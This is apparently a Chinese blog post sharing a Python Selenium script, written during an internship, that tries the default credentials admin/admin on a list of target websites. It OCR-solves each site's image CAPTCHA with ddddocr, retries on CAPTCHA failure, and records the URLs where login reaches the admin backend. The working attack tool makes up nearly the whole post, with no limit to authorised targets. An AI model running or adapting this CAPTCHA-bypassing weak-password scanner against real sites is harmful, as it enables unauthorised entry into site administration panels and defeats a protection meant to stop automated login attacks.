---
title: 一个用单个弱密码测试大量网站脚本（含图片验证码识别）
abbrlink: 35069
date: 2021-08-20
---
实习期间写的，能用就行

<!--more-->

```py
# -*- coding: utf-8 -*-  

'''
pip install dddd_ocr
pip install selenium
'''
from typing import Text
from requests.exceptions import Timeout
from requests.models import Response
from selenium import webdriver
from PIL import Image
import requests
import time
import sys
import ddddocr

def get_pic(url):
  
    browser.get(url)
    time.sleep(2)
    png = browser.find_element_by_id('imgObj')  # 查找验证码元素
    png.screenshot('capt.png')  # 对验证码进行截图并保存
    img = Image.open('capt.png')
    img = img.convert('L')  # P模式转换为L模式(灰度模式默认阈值127)
    count = 190  # 设定阈值
    table = []
    for i in range(256):
        if i < count:
            table.append(0)
        else:
            table.append(1)
    img = img.point(table, '1')
    img.save('captcha1.png')  # 保存处理后的验证码

# def bd_discern():     #百度OCR，要钱
#     APP_ID = ''
#     API_KEY = ''
#     SECRET_KEY = ''
#     # 初始化对象
#     client = AipOcr(APP_ID, API_KEY, SECRET_KEY)
#     # 读取图片
#     def get_file_content(file_path):
#         with open(file_path, 'rb') as f:
#             return f.read()

#     image = get_file_content('captcha1.png')
#     # 定义参数变量
#     options = {'language_type': 'ENG', }  # 识别语言类型，默认为'CHN_ENG'中英文混合
#     #  调用通用文字识别
#     try:
#         result = client.basicGeneral(image, options)  # 高精度接口 basicAccurate  
#     except:
#         print("???")

#     print (result)
#     for word in result['words_result']:
#         captcha = (word['words'])
#         print('识别结果：' + captcha)
#         return captcha

def dddd_ocr():
    ocr = ddddocr.DdddOcr()
    with open("./captcha1.png","rb") as f:
        img = f.read()
    res = ocr.classification(img)
    print (res)
    return res


def submit(cap):
    browser.find_element_by_id('aa').send_keys('admin')  
    browser.find_element_by_id('bb').send_keys('admin')  
    browser.find_element_by_id('cc').send_keys(cap) 
    browser.find_element_by_id('loginBtn').click()
  
# def is_alter():
#     try:
#         alter = browser.switch_to.alert()
#         alter.text
#         if '密码错误' in dig_alert.text :
#             browser.quit()
#             return 1
#         elif '验证码错误' in dig_alert.text:
#             dig_alert.accept()
#             return 2
#     except:
#         return False

if __name__=='__main__':
    outputH=open(r"C:\Users\Bruce\Desktop\实习\ip\脚本\outputH.txt","w+")
    option = webdriver.ChromeOptions()
    # 防止打印一些无用的日志
    option.add_experimental_option("excludeSwitches", ['enable-automation', 'enable-logging'])
    option.add_argument('--ignore-certificate-errors')
    # 阻止弹出浏览器
    option.add_argument('--headless')
    option.add_argument('--disable-gpu')

    web = open("target.txt","r")
    lines = web.readlines()
    for i in lines:
        browser = webdriver.Chrome("C:\Program Files\Google\Chrome\Application\chromedriver.exe",chrome_options=option)
        browser.set_page_load_timeout(10)
        max_time=4
        while max_time:
            try:
                get_pic(i)
            except:
                browser.quit()
                break
            #cap = bd_discern()
            cap = dddd_ocr()
            url1 = browser.current_url
          
            max_time=max_time-1
            submit(cap)     #尝试登录
            time.sleep(1)
          
            try:            #如果浏览器弹出对话框
                dig_alert = browser.switch_to_alert()
                dig_alert.text
                if '密码错误' in dig_alert.text :   #停止尝试当前url
                    browser.quit()
                    break
                elif '验证码错误' in dig_alert.text:    #再次登录
                    dig_alert.accept()
                    continue              
              
            except:
                #判断进入了后台则记录到文本中
                url2 = browser.current_url
                print(url1)
                print(url2)

                outputH.write(i)
                outputH.flush()
                break
```
